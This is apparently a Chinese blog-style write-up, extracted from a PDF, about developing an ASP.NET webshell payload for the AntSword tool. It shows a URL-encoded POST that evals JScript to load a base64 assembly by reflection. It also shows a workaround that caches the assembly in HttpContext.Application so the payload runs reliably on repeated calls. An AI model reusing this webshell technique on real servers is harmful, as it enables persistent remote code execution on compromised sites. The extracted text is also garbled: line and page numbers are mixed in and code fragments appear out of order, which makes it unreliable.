web项⽬中新建base.aspx
POST:
发现第⼀次是可以正常调⽤的
1 
1 ant=var%20Payload%20%3D%22xxxxxxxxx%22%3B%0Avar%20myAssebly%20%3D%
20System.Reflection.Assembly.Load(Convert.FromBase64String(Payload
))%3B%0Avar%20myPaylaod%3DmyAssebly.CreateInstance(%22AntPayload.R
un%22).Equals(this)%3B%0AmyPaylaod.Equals(this)%3B
8
但是第⼆次执⾏就会提示下⾯的错误
1 [A]AntPayload.Run ⽆法强制转换为 [B]AntPayload.Run。类型 A 源⾃“AntPayl
oad, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null”(在字节数
组的上下⽂“LoadNeither”中)。类型 B 源⾃“AntPayload, Version=1.0.0.0, C
9
搜了⼀下发现没有什么有⽤的回答，猜测⼤概是跟java中类重复加载⼀样的报错。
所以就加了⼀层判断，如果当前存在 AntPayload.Run 这个类型的assembly就不重复进⾏加载。
新建项⽬test0.aspx测试⼀下
ulture=neutral, PublicKeyToken=null”(在字节数组的上下⽂“LoadNeither”中
)。
 1  
 2 
12
发现 Type.GetType 永远为undefined。以为是函数⽤的不对，后来⼜换了
System.Reflection.Assembly.GetCallingAssembly().GetType，
System.Reflection.Assembly.GetExecutingAssembly().GetType都不⾏。
接着发现虽然把代码直接写在jscript中可以多次稳定触发，如果把以上代码通过eval打进⼊仍然会报上⾯
类型转换的错误。
另外还发现⼀些奇怪的地⽅，如果直接代码写在jscript⽂件中可以⽤这种写法：
但是如果通过eval传进去就只能⽤这种写法
否则会报如下错误，⾕歌也没查到怎么解决，神秘。
1         var obj=System.Activator.CreateInstance(type);
2         obj.Equals("");
1         var assembly = System.Reflection.Assembly.GetExecutingAsse
mbly();
2         var obj = assembly.CreateInstance("AntPayload.Run");
3         obj.Equals("");
13
试了很多办法都失败了，后来⾕歌搜到了⼀篇2012年的博客遇到了同样的问题，⼤概意思是说两次的
assembly被加载到了不同的上下⽂中，所以被当作成为不同的类，⽆法进⾏类型转换。
跟北⾠师傅研究了⼀番后，北⾠师傅想到⼀种⽅法：把第⼀次加载后的assembly的引⽤给存到当前
Application的上下⽂中，即HttpContext.Current.Application这个类⾥⾯，然后再通过
Application.Get("ant")拿到引⽤，然后反射，再获取实例化，这样就可以解决上下⽂不同的问题。
payload修改如下
问题解决
1 var Payload="xxxxx";
2 HttpContext.Current.Application.Add("ant", System.Reflection.Assem
bly.Load(Convert.FromBase64String(Payload)));
14
然后通过eval打过去，此时就可以多次稳定触发payload了。
特别感谢北⾠师傅的交流探讨！
初学.net，有些地⽅是凭借⾃⼰的理解写的，如果有说的不对的地⽅欢迎指出，以免误导他⼈。
3 HttpContext.Current.Application.Get("ant").GetType("AntPayload.Ru
n").GetConstructor(new Type[0]).Invoke(null).Equals(this);
最后